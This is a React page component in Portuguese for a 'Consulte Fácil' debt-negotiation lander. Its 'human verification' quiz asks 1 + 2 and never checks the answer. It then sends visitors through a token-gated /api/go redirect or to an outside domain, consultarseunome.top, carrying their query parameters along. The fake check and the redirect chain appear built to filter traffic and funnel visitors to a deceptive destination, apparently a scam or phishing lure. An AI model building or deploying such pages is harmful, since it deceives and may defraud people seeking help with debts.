import { useState } from "react";

export default function Quiz() {
  const [answer, setAnswer] = useState("");
  const [loading, setLoading] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [cookiesOpen, setCookiesOpen] = useState(true);

  // ===== Helper para anexar parâmetros =====
  const withQuery = (url) => {
    try {
      const srcQs =
        typeof window !== "undefined" ? window.location.search : "";
      if (!srcQs || srcQs === "?") return url;

      const dest = new URL(
        url,
        typeof window !== "undefined"
          ? window.location.origin
          : "https://example.com"
      );
      const incoming = new URLSearchParams(srcQs);

      incoming.forEach((val, key) => {
        if (!dest.searchParams.has(key)) dest.searchParams.set(key, val);
      });

      return (
        dest.pathname +
        (dest.search ? dest.search : "") +
        (dest.hash || "")
      );
    } catch {
      return url;
    }
  };
  // ========================================

  const handleSubmit = async () => {
    setLoading(true);

    const wait = (ms) => new Promise((r) => setTimeout(r, ms));

    const goDefault = async () => {
      await wait(300);
      window.location.href = withQuery("https://www.consultarseunome.top/f2/");
    };

    try {
      const res = await fetch(withQuery("/api/session-token"), {
        method: "POST",
      });

      const data = await res.json().catch(() => null);

      if (res.ok && data?.token) {
        window.location.href = withQuery(
          `/api/go?token=${encodeURIComponent(data.token)}`
        );
      } else {
        await goDefault();
      }
    } catch {
      await goDefault();
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
      <main className="wrapper">
        <section className="card">
          <h1 className="title">Consulte Fácil</h1>

          <div className="iconWrap" aria-hidden="true">
            <div className="iconCircle">
              <svg
                width="64"
                height="64"
                viewBox="0 0 24 24"
                role="img"
                aria-label="Protegido"
              >
                <defs>
                  <radialGradient id="shieldGrad" cx="50%" cy="30%" r="70%">
                    <stop offset="0%" stopColor="#ffd84d" stopOpacity="0.95" />
                    <stop offset="100%" stopColor="#ffb300" stopOpacity="1" />
                  </radialGradient>
                  <filter id="shieldGlow" x="-30%" y="-30%" width="160%" height="160%">
                    <feDropShadow
                      dx="0"
                      dy="1"
                      stdDeviation="1.6"
                      floodColor="#ffb300"
                      floodOpacity="0.6"
                    />
                  </filter>
                </defs>

                <path
                  d="M12 3l7 3v6c0 4.418-3.582 8-7 8s-7-3.582-7-8V6l7-3z"
                  fill="url(#shieldGrad)"
                  filter="url(#shieldGlow)"
                />
                <path
                  d="M10.6 13.4l-2.1-2.1 1.1-1.1 1 1 3.9-3.9 1.1 1.1-5 5z"
                  fill="#ffffff"
                  stroke="#ffffff"
                  strokeWidth="0.4"
                  filter="url(#shieldGlow)"
                />
              </svg>
            </div>
          </div>

          <p className="subtitle">
            Você pode estar apto à negociação. Clique abaixo para consultar
          </p>

          <button
            className="cta"
            onClick={() => setModalOpen(true)}
            aria-haspopup="dialog"
            aria-controls="modal-root"
          >
            CONSULTAR AGORA
          </button>

          <nav className="links" aria-label="links-legais">
            <a href="/politica-de-privacidade">Política de Privacidade</a>
            <span className="sep">|</span>
            <a href="/termos-de-uso">Termos de Uso</a>
          </nav>
        </section>
      </main>

      {cookiesOpen && (
        <div className="cookieBar" role="region" aria-label="cookies">
          <span>Usamos cookies para melhorar sua experiência.</span>
          <button
            type="button"
            className="cookieBtn"
            onClick={() => setCookiesOpen(false)}
          >
            Aceitar
          </button>
        </div>
      )}

      {modalOpen && (
        <div
          id="modal-root"
          className="backdrop"
          role="dialog"
          aria-modal="true"
          aria-labelledby="modal-title"
        >
          <div className="modal popIn">
            {step === 1 && (
              <>
                <h2 id="modal-title" className="modalTitle">
                  Bem-vindo ao portal de atendimento
                </h2>
                <p className="modalText">
                  Para continuar, faremos uma verificação simples.
                </p>
                <button className="primary microTilt" onClick={() => setStep(2)}>
                  Iniciar verificação
                </button>
                <button
                  className="ghost"
                  onClick={() => {
                    setModalOpen(false);
                    setStep(1);
                    setAnswer("");
                  }}
                >
                  Cancelar
                </button>
              </>
            )}

            {step === 2 && (
              <>
                <h3 className="sectionOver">Prova humana para prosseguir</h3>
                <h2 className="question">Quanto é 1 + 2?</h2>

                <input
                  type="text"
                  value={answer}
                  onChange={(e) => setAnswer(e.target.value)}
                  placeholder="Digite sua resposta"
                  className="input"
                />

                <div className="row">
                  <button
                    className="primary microTilt"
                    onClick={handleSubmit}
                    disabled={loading}
                  >
                    {loading ? "Verificando..." : "Prosseguir"}
                  </button>
                  <button
                    className="ghost"
                    onClick={() => {
                      setStep(1);
                      setAnswer("");
                    }}
                  >
                    Voltar
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* ===== GLOBAL ===== */}
      <style jsx global>{`
        html,
        body,
        #__next {
          height: 100%;
        }
        * {
          box-sizing: border-box;
        }
        body {
          margin: 0;
          background: #fff15933; /* amarelo suave */
          color: #1a2e35;
          font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
        }
        :focus-visible {
          outline: 3px solid rgba(52, 131, 250, 0.45);
          outline-offset: 2px;
        }
      `}</style>

      {/* ===== SCOPED (APENAS VISUAL) ===== */}
      <style jsx>{`
        .page {
          min-height: 100dvh;
          display: grid;
          place-items: center;
          padding: 32px 16px 96px;
          background: #fff8c4;
        }

        .card {
          width: min(720px, 92vw);
          background: #ffffff;
          border-radius: 16px;
          padding: 36px 28px 28px;
          border: 1px solid #ffe680;
          box-shadow: 0 8px 24px rgba(26, 46, 53, 0.06);
          text-align: center;
        }

        .title {
          color: #1a2e35;
          font-weight: 800;
        }

        .iconCircle {
          width: 108px;
          height: 108px;
          border-radius: 999px;
          display: grid;
          place-items: center;
          background: radial-gradient(circle at 30% 30%, #fffef0, #ffe46b 60%, #fff159);
          border: 1px solid #ffe680;
          box-shadow: inset 0 1px 6px rgba(255, 241, 89, 0.2),
            0 8px 20px rgba(26, 46, 53, 0.05);
        }

        .subtitle {
          color: #333;
        }

        .cta {
          background: #3483fa;
          border: none;
          color: #fff;
          font-weight: 800;
          padding: 12px 22px;
          border-radius: 10px;
          cursor: pointer;
          box-shadow: 0 8px 18px rgba(52, 131, 250, 0.22);
          transition: 0.2s;
        }

        .cta:hover {
          filter: brightness(1.05);
          transform: translateY(-1px);
        }

        .links a {
          color: #3483fa;
          font-weight: 600;
          text-decoration: underline;
        }

        .sep {
          color: #777;
        }

        .cookieBar {
          background: #fff;
          border: 1px solid #ffe680;
          box-shadow: 0 10px 24px rgba(26, 46, 53, 0.08);
        }

        .cookieBtn {
          background: #3483fa;
          border: none;
          color: #fff;
          padding: 10px 18px;
          border-radius: 8px;
          font-weight: 800;
          cursor: pointer;
          transition: 0.2s;
        }

        .cookieBtn:hover {
          filter: brightness(1.05);
        }

        .backdrop {
          background: rgba(26, 46, 53, 0.45);
        }

        .modal {
          background: #fff;
          border: 1px solid #ffe680;
          color: #1a2e35;
        }

        .modalTitle,
        .question {
          color: #1a2e35;
        }

        .sectionOver {
          color: #3483fa;
        }

        .input {
          border: 1px solid #3483fa77;
          text-align: center;
        }

        .primary {
          background: #3483fa;
          color: #fff;
          border: none;
          font-weight: 800;
        }

        .ghost {
          border: 1px solid #3483fa66;
          color: #1a2e35;
        }

        .ghost:hover {
          background: #eef4ff;
        }
      `}</style>
    </div>
  );
}
